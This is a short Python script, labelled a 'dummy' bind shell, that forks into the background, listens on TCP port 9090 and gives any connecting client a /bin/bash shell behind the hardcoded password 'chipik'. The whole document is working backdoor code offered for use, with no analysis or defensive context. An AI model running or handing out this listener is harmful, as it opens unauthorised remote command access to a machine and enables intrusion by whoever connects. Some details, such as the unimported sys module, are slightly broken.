#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# Dummy python bind shell

__author__ = '090h'
__license__ = 'GPL'

import select
from pty import spawn, fork
from socket import *
from sys import exit
from os import getpid, fdopen, read
import os

if os.fork():
    exit(0)

try:
    watch = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
    port = 9090
    die = False
#    watch.set_reuse_addr()
    watch.bind(("",port))
    watch.listen(5)
except:
    print("[%d] unable to create socket, exiting.." % getpid())
    exit()
else:
    print("[%d] bindshell on port %d" % (getpid(),port))

while True:
    sock, remote = watch.accept()
    if os.fork():
        continue

    pid, childID = fork()

    if pid == 0:
        if (raw_input("password? ")) == "chipik":
            spawn( "/bin/bash")
    else:
        b = sock.makefile(os.O_RDONLY|os.O_NONBLOCK)
        c = fdopen(childID,'r+')
        data = ""
        x = {b:c,c:b}

        while True:
            for f in select.select([b,c],[],[])[0]:
                try:
                    d = read(f.fileno(),4096)
                except:
                    sys.exit(0)

                if f is c and d.strip()==data:
                    data= ""
                    continue

                x[f].write(d)
                x[f].flush()
                data = d.strip()

    sock.close()